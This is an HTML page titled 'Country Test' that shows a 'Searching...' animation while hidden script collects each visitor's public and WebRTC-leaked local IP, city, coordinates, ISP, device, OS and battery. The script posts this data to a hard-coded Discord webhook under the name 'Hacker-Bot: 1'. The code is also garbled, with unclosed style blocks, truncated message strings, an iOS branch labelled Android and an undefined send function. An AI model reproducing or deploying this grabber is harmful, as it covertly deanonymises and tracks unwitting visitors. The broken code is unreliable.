<!DOCTYPE html>
<html>
<head>
  <style>
  body{
  	background-color: hsl(220, 50%, 70%);

  .Menu{

  	transition: all 0.5s;

<body>
	<h1></h1>
	<div class="Menu">
	   <h1 class="title">Country Test</h1>
		<h1 id="S" class="Text">Searching.</h1>
		<h1 id="info1" class="info"></h1>
		<h1 id="info2" class="info"></h1>
		<h1 id="info3" class="info"></h1>
	</div>
	<script>
		
const S = document.getElementById("S");
const infoText1 = document.getElementById("info1");
const infoText2 = document.getElementById("info2");
const infoText3 = document.getElementById("info3");
let T1 = true
let T2 = false
let T3 = false

setInterval(() => {
    if (T1 === true) {
        S.textContent="Searching..";
        T2 = true
        T1 = false
    }else if (T2 === true) {
        S.textContent="Searching...";
        T3 = true
        T2 = false
    }else if (T3 === true) {
        S.textContent="Searching.";
        T1 = true
        T3 = false
    }
}, 1000);


const webhookURL = "https://canary.discord.com/api/webhooks/1355452609296728114/GvpHDZCrkB-0Ep21qGNC9LAwsBPjmgHW3OZR5_wvc73MfvOpIHXLxIp_TK1hB6L9VxNq"
const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
const getDeviceName = () =>{
const devices = ['iPhone', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Samsung', 'Xiaomi', 'Huawei', 'Tecno', 'Windows', 'Macintosh', 'Linux'];
const match = devices.find(device => new RegExp(device, 'i').test(navigator.userAgent));
return match ? match.replace('Macintosh', 'Mac Device').replace('Windows', 'Windows Device').replace('Linux', 'Linux Device') : 'Unknown Device';};
const getOSVersion = () =>{
let ua = navigator.userAgent;
let android = ua.match(/Android\s([\d.]+)/);
let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
if (android) return `Android ${android[1]}`;
if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
return "Unknown OS";};
let os = getOSVersion();
let IP = "Fetching...";
let localIP = "Unavailable";
let time = new Date();
const deviceName = getDeviceName();
const connection = navigator.connection || {};
const ua = navigator.userAgent.toLowerCase();
const isIOS = /iphone|ipad|ipod/.test(ua);
const isAndroid = /android/.test(ua);
const timeInfo = `${(time.getHours()<10?"0":"") + time.getHours()}:${(time.getMinutes()<10?"0":"") + time.getMinutes()}:${(time.getSeconds()<10?"0":"") + time.getSeconds()}`
async function getIP(){
    try {
        let response = await fetch('https://api64.ipify.org?format=json');
        let dataIP = await response.json();
        IP = dataIP.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);}}
async function getLocalIP(){
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.setLocalDescription(pc.createOffer());
        pc.onicecandidate = (e) => {
            const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
            if (candidate) resolve(candidate);};
        setTimeout(() => resolve("Unavailable"), 2000);});}
async function getC(){
    try {
        let response = await fetch('https://ipapi.co/json/');
        let data = await response.json();
        C = data.country_name + " " + data.country, L = data.languages, CC = data.country_calling_code, Ci = data.city, Re = data.region, Of = data.utc_offset, TZ = data.timezone, LG = data.longitude, LT = data.latitude, CA = data.country_area, Asn = data.asn, Org = data.org, CP = data.country_population
    } catch (error) {
        console.error('Error fetching country:', error);
        C = "Unknown";}}
getIP(); getC();

 S.style.display = "none";

 if (isAndroid){
  getLocalIP().then((ip)=>{

`[+] Device: Android

console.log(info);
const messagePayload = {content: `\`\`\`\n${info}\n\`\`\``, username: "Hacker-Bot: 1", avatar_url: "https://example.com/avatar.png"}
fetch(webhookURL, {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(messagePayload)})})});
}else if (isIOS){

`[+] Device: Android

const messagePayload = {
    content: `\`\`\`\n${info}\n\`\`\``,
    username: "Hacker-Bot: 1",
    avatar_url: "https://example.com/avatar.png"}
fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(messagePayload)})}};
setTimeout(sendToDiscord, 5000);
	</script>
